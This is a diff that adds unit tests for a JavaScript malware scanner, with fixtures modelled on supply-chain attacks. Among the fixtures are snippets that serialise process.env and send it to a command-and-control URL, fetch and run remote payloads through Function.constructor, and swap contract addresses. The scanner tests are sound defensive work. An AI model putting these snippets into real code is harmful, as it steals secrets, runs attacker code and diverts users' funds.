@@ -125,3 +125,288 @@ test("browser profile theft is still caught; bare mnemonic needs a file read plu
 	assert.deepEqual(rules(scan("w.js", "const mnemonic = generateMnemonic();")), []);
 	assert.equal(scan("w.js", "const m = fs.readFileSync('mnemonic.txt');\nfetch('https://x.example', { method: 'POST', body: m });").level, LEVEL.DANGER);
 });
+
+// ── New gap coverage (from malware-museum + contagious-interview research, 2026-11-13) ─────────
+
+// Sample 1 (Supply Chain / metrica-node): `new Function.constructor("require", payload)(require)`
+// is an alias for `new Function` that bypasses the simpler `Function(` check.
+test("Function.constructor used to execute downloaded payload is high (Sample 1 pattern)", () => {
+	// Pattern: decode a URL, fetch payload, execute via Function.constructor — common in metrica-node style attacks
+	const r = scan("lib/caller.js", "const handler = new Function.constructor('require', await axios.get(src).data);\nhandler(require);");
+	assert.ok(rules(r).includes("remote_code_load"), "Function.constructor with remote fetch should trigger remote_code_load");
+	assert.equal(r.level, LEVEL.DANGER);
+});
+
+test("Function.constructor with base64 decoded payload is high", () => {
+	const r = scan("lib/loader.js", "new Function.constructor('return', Buffer.from(encoded, 'base64').toString())();");
+	assert.ok(rules(r).includes("decode_exec"), "Function.constructor with base64 should trigger decode_exec");
+});
+
+test("obj.Function.constructor and page.Function.constructor are not flagged (false-positive guard)", () => {
+	assert.deepEqual(rules(scan("x.js", "const f = page.Function.constructor('x', 'return x');")), []);
+	assert.deepEqual(rules(scan("x.js", "obj.Function.constructor('a', 'b');")), []);
+});
+
+// Sample 3 & 4 (Crypto/DAO stealers): Node.js built-ins listed as npm `dependencies`.
+// `child_process`, `fs`, `crypto`, `path` are built-ins — no npm install needed.
+// When an attacker wraps their payload in a fake package they still declare these to satisfy `require`.
+test("Node.js built-ins as npm dependencies are flagged (Samples 3 & 4 pattern)", () => {
+	const r = scan("package.json", JSON.stringify({
+		dependencies: { express: "^4.18.0", child_process: "^1.0.2", fs: "^0.0.1-security" },
+	}));
+	const ruleIds = rules(r);
+	assert.ok(ruleIds.includes("builtin_as_dep"), "child_process as dependency should be flagged");
+	assert.equal(ruleIds.filter((id) => id === "builtin_as_dep").length, 2, "both child_process and fs should be flagged");
+});
+
+test("Node.js built-ins in devDependencies are not flagged (some tools do this)", () => {
+	const r = scan("package.json", JSON.stringify({
+		devDependencies: { child_process: "^1.0.2", crypto: "^1.0.1" },
+	}));
+	assert.ok(!rules(r).includes("builtin_as_dep"), "devDependencies built-ins should not be flagged");
+});
+
+test("normal dependencies are not flagged as built-ins", () => {
+	const r = scan("package.json", JSON.stringify({
+		dependencies: { express: "^4.18.0", react: "^18.2.0", "next": "^14.0.0" },
+	}));
+	assert.deepEqual(rules(r), []);
+});
+
+// Samples 3, 4 & Lazarus Stage 1: whitespace-padding technique (1400+ spaces push payload off-screen).
+test("whitespace-hidden payload (500+ leading spaces before code) is flagged as high", () => {
+	const hiddenLine = " ".repeat(600) + "(function(_0x1a2b){return _0x1a2b})('x');";
+	const r = scan("routes/api/transactions.js", "const router = require('express').Router();\nmodule.exports = router;\n" + hiddenLine);
+	assert.ok(rules(r).includes("whitespace_hidden"), "whitespace-padded hidden code should be caught");
+	assert.equal(r.level, LEVEL.DANGER);
+});
+
+test("normal indentation (up to 20 spaces) is not whitespace_hidden", () => {
+	const normalCode = "    ".repeat(4) + "const x = require('express');"; // 16 spaces
+	assert.deepEqual(rules(scan("server.js", normalCode)), []);
+});
+
+// BeaverTail / Lazarus Stage-1: explicitly serializing process.env into a network request body.
+// Sends JWT_SECRET, MONGO_URI, AWS keys, etc. in one HTTP call.
+test("serializing process.env into a network request body is high (BeaverTail pattern)", () => {
+	const r = scan("routes/api/auth.js",
+		"const params = new URLSearchParams({ processInfo: JSON.stringify(process.env), tid: 'x' });\n" +
+		"const res = await fetch(c2url + '?' + params);");
+	assert.ok(rules(r).includes("process_env_exfil"), "JSON.stringify(process.env) + fetch should be caught");
+	assert.equal(r.level, LEVEL.DANGER);
+});
+
+test("per-key process.env access with fetch is NOT flagged (normal Express/Next.js app)", () => {
+	// A real app that reads per-key env vars and also makes HTTP calls must not be flagged.
+	const r = scan("lib/api.js",
+		"const dbUrl = process.env.DATABASE_URL;\n" +
+		"const apiKey = process.env.API_KEY;\n" +
+		"const res = await fetch('https://api.example.com/data', { headers: { Authorization: `Bearer ${apiKey}` } });");
+	assert.ok(!rules(r).includes("process_env_exfil"), "per-key env access with fetch must not trigger process_env_exfil");
+});
+
+// Sample 5 (Typosquat via vite.config.js): a build config file that makes network requests is suspicious.
+// A Vite plugin with a network sink runs at build time with full filesystem access.
+test("network call inside a vite config file is flagged (Sample 5 / graphalgo pattern)", () => {
+	const r = scan("vite.config.js",
+		"import { defineConfig } from 'vite';\n" +
+		"import react from '@vitejs/plugin-react';\n" +
+		"import logger from 'eslints-logger';\n" +
+		"logger.init({ endpoint: 'https://collector.example.com' });\n" +
+		"fetch('https://collector.example.com/beacon');\n" +
+		"export default defineConfig({ plugins: [react()] });");
+	assert.ok(rules(r).includes("config_file_net"), "fetch inside vite.config.js should trigger config_file_net");
+});
+
+test("vite config without network calls is clean (normal project regression)", () => {
+	const r = scan("vite.config.ts",
+		"import { defineConfig } from 'vite';\nimport react from '@vitejs/plugin-react';\n" +
+		"export default defineConfig({ plugins: [react()], server: { port: 3000 } });");
+	assert.deepEqual(rules(r), [], "clean vite config should not be flagged");
+});
+
+test("tailwind config without network calls is clean (normal project regression)", () => {
+	const r = scan("tailwind.config.js",
+		"/** @type {import('tailwindcss').Config} */\nexport default {\n  content: ['./src/**/*.{js,ts,jsx,tsx}'],\n  theme: { extend: {} },\n  plugins: [],\n};");
+	assert.deepEqual(rules(r), [], "clean tailwind config should not be flagged");
+});
+
+// Regression: a typical Next.js / Express server uses process.env for config but must NOT be flagged.
+test("normal Next.js API route reading env vars and calling an external API is not flagged", () => {
+	const r = scan("src/app/api/data/route.ts",
+		"const apiBase = process.env.NEXT_PUBLIC_API_URL;\n" +
+		"const secret = process.env.API_SECRET;\n" +
+		"export async function GET() {\n" +
+		"  const res = await fetch(`${apiBase}/items`, { headers: { 'x-api-key': secret } });\n" +
+		"  return Response.json(await res.json());\n" +
+		"}");
+	assert.ok(!rules(r).includes("process_env_exfil"), "Next.js API route must not trigger process_env_exfil");
+	assert.equal(r.level, LEVEL.NONE);
+});
+
+// Regression: a normal Supabase + Express server must stay clean.
+test("normal Supabase/Express server is not flagged", () => {
+	const r = scanRepo([
+		{
+			path: "package.json",
+			content: JSON.stringify({
+				scripts: { start: "node server.js", dev: "nodemon server.js" },
+				dependencies: { express: "^4.18.0", "@supabase/supabase-js": "^2.39.0" },
+			}),
+		},
+		{
+			path: "server.js",
+			content:
+				"import express from 'express';\n" +
+				"import { createClient } from '@supabase/supabase-js';\n" +
+				"const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_ANON_KEY);\n" +
+				"const app = express();\n" +
+				"app.get('/items', async (req, res) => {\n" +
+				"  const { data } = await supabase.from('items').select('*');\n" +
+				"  res.json(data);\n" +
+				"});\n" +
+				"app.listen(3000);\n",
+		},
+	]);
+	assert.equal(r.level, LEVEL.NONE);
+	assert.deepEqual(r.findings, []);
+});
+
+// ── Harder gaps (round 2, 2026-11-13) ────────────────────────────────────────────────────────
+
+// ── Multi-line decode+exec (decode_exec_split) ───────────────────────────────────────────────
+// The existing decode_exec rule requires both halves on the same line.
+// Split across lines is MEDIUM — weaker certainty but still worth flagging.
+
+test("atob on one line + eval on another is flagged as decode_exec_split (MEDIUM)", () => {
+	const r = scan("lib/loader.js",
+		"const decoded = atob(payload);\n" +
+		"// do some stuff\n" +
+		"eval(decoded);");
+	assert.ok(rules(r).includes("decode_exec_split"), "split atob + eval should trigger decode_exec_split");
+	// MEDIUM not HIGH — same-line is HIGH; split is advisory
+	const f = r.findings.find((x) => x.rule === "decode_exec_split");
+	assert.equal(f.severity, "medium");
+});
+
+test("Buffer.from(...,'base64').toString() on one line + new Function on another is flagged", () => {
+	const r = scan("routes/auth.js",
+		"const src = Buffer.from(encoded, 'base64').toString();\n" +
+		"const handler = new Function('require', src);\n" +
+		"handler(require);");
+	assert.ok(rules(r).includes("decode_exec_split"));
+});
+
+test("String.fromCharCode spread across lines + eval is flagged", () => {
+	const r = scan("x.js",
+		"const s = String.fromCharCode(104, 101, 108, 108, 111);\n" +
+		"eval(s);");
+	assert.ok(rules(r).includes("decode_exec_split"));
+});
+
+// same-line still fires decode_exec HIGH (not the split version)
+test("same-line atob+eval still fires decode_exec HIGH, not the split version", () => {
+	const r = scan("x.js", "eval(atob(payload));");
+	assert.ok(rules(r).includes("decode_exec"), "same-line must still fire decode_exec");
+	assert.ok(!rules(r).includes("decode_exec_split"), "same-line must not also fire the split rule");
+	assert.equal(r.level, LEVEL.DANGER);
+});
+
+// False-positive regressions for decode_exec_split
+test("Buffer.from without 'base64' argument + eval is NOT flagged (image/binary data)", () => {
+	// A utility that converts an image buffer to binary alongside a template engine using eval
+	const r = scan("img-utils.js",
+		"const binary = Buffer.from(imageData).toString('binary');\n" +
+		"const rendered = eval(templateExpr);");
+	assert.ok(!rules(r).includes("decode_exec_split"), "Buffer.from without base64 keyword must not trigger split rule");
+});
+
+test("btoa (encoding, not decoding) alongside eval is NOT flagged", () => {
+	// btoa encodes — the DECODE_EXPR only matches atob (decode direction)
+	const r = scan("auth.js",
+		"const token = btoa(username + ':' + password);\n" +
+		"const result = eval(safeExpression);");
+	assert.ok(!rules(r).includes("decode_exec_split"), "btoa (encoding) must not trigger the decode half");
+});
+
+test("normal crypto usage alongside eval template engine is NOT flagged", () => {
+	// Legitimate: a build script that uses base64 for asset encoding and eval for config templates
+	const r = scan("build.js",
+		"// encode asset to base64 for embedding\n" +
+		"const asset = Buffer.from(fs.readFileSync('./logo.png')).toString('base64');\n" +
+		"const config = eval('(' + configJson + ')');");
+	// Buffer.from without 'base64' as decode input — should not fire
+	assert.ok(!rules(r).includes("decode_exec_split"));
+});
+
+// ── Broader process.env serialization variants ───────────────────────────────────────────────
+
+test("spreading process.env into a JSON body is high (BeaverTail variant)", () => {
+	const r = scan("routes/auth.js",
+		"const body = JSON.stringify({ sysInfo: hostname, processInfo: { ...process.env } });\n" +
+		"fetch(c2url, { method: 'POST', body });");
+	assert.ok(rules(r).includes("process_env_exfil"), "spread process.env in JSON.stringify must be caught");
+	assert.equal(r.level, LEVEL.DANGER);
+});
+
+test("qs.stringify(process.env) sent over network is high", () => {
+	const r = scan("lib/beacon.js",
+		"const payload = qs.stringify(process.env);\n" +
+		"axios.post(c2, { data: payload });");
+	assert.ok(rules(r).includes("process_env_exfil"), "qs.stringify(process.env) must be caught");
+});
+
+test("btoa(JSON.stringify(process.env)) is high (encoded exfil)", () => {
+	const r = scan("lib/init.js",
+		"const encoded = btoa(JSON.stringify(process.env));\n" +
+		"fetch(url, { method: 'POST', body: encoded });");
+	assert.ok(rules(r).includes("process_env_exfil"), "base64-encoded env exfil must be caught");
+});
+
+// Regression: legitimate uses of process.env alongside network calls must stay clean
+test("createClient(process.env.URL, process.env.KEY) alongside fetch is NOT flagged", () => {
+	const r = scan("lib/db.js",
+		"const client = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_ANON_KEY);\n" +
+		"const res = await fetch(`${process.env.API_URL}/data`);");
+	assert.ok(!rules(r).includes("process_env_exfil"), "per-key env access must not trigger process_env_exfil");
+});
+
+// ── Contract-address swap (addr_concat_swap) ─────────────────────────────────────────────────
+
+test("hidden state flag+value swapping contract address via '0x'+var inside if(&&) is flagged", () => {
+	// Direct replica of the Sample 3 pattern: multi-condition if, "0x" + hidden var
+	const r = scan("src/pages/Home.js",
+		"const [data] = useState({ flag: false, value: 321651351, id: '48a2cae82fcd84e64fc802d2aeeb180fe1fbca70' });\n" +
+		"if (balanceInEth.toFixed(5) * 1 > data.value * 1 && data.flag) setRouter('0x' + data.id);");
+	assert.ok(rules(r).includes("addr_concat_swap"), "Sample 3 contract-address swap must be caught");
+});
+
+test("numeric threshold + flag controlling router address swap is flagged", () => {
+	const r = scan("Staking.jsx",
+		"if (inputAmount > threshold && flagEnabled) setContract('0x' + hiddenAddr);");
+	assert.ok(rules(r).includes("addr_concat_swap"));
+});
+
+// False-positive regressions for addr_concat_swap
+test("single-condition address formatter is NOT flagged", () => {
+	// Legitimate: normalise an address that may be missing the 0x prefix
+	const r = scan("utils.js", "if (!addr.startsWith('0x')) addr = '0x' + addr.toLowerCase();");
+	assert.deepEqual(rules(r), [], "single-condition 0x prefix formatter must not be flagged");
+});
+
+test("full hardcoded contract address in React state is NOT flagged", () => {
+	const r = scan("App.jsx",
+		"const TOKEN = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';\n" +
+		"const [router, setRouter] = useState(TOKEN);");
+	assert.deepEqual(rules(r), [], "full constant address must not be flagged");
+});
+
+test("normal DeFi app with address constants and conditional logic is NOT flagged", () => {
+	// A real Uniswap-style swap: pick between two full address constants based on network
+	const r = scan("hooks/useSwap.ts",
+		"const routerAddr = chainId === 1\n" +
+		"  ? '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D'\n" +
+		"  : '0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3';\n" +
+		"setRouter(routerAddr);");
+	assert.deepEqual(rules(r), [], "ternary with full address constants must not be flagged");
+});
